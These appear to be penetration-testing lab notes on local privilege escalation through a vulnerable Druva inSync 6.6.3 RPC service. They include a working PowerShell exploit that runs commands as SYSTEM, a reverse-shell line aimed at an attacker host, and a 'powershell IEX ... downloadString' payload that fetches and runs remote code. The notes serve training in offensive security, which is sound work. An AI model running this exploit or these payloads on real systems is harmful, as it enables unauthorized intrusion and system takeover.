We may be able to escaleate privileges on well-patched, well-configured systems if users
are permitted to install software or vulnerable third-party applications and services used
by the organization.

#### Enumerating Installed Programs

![[Pasted image 20230107125132.png]]

Most of these apps are standared, but `Druva inSync 6.6.3` stands out. Googling shows this version
is vulnerable to a command injection attack via an exposed RPC service.

https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/

This blogpost details the initial discovery of the flaw.  This application is used for `integrated`
`backup, eDiscovery and compliance monitoring`, and runs as `SYSTEM`. Escalation is possible by
interacting with a service running locally on port 6064.

![[Pasted image 20230107130041.png]]

#### Enumerating Process ID

Double Check:
![[Pasted image 20230107130136.png]]

#### Enumerating Running Service

Triple Check:
![[Pasted image 20230107130229.png]]

## Druva inSync Windows Client LPE Example

Proof of Concept:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

#### Modifying the PoC

Open `Invoke-PowerShellTcp.ps1` from our attack host and rename it, open the file
and append the following line at the bottom.

```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Simply modify the $cmd variable in the PoC to download our revshell:
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')"
```



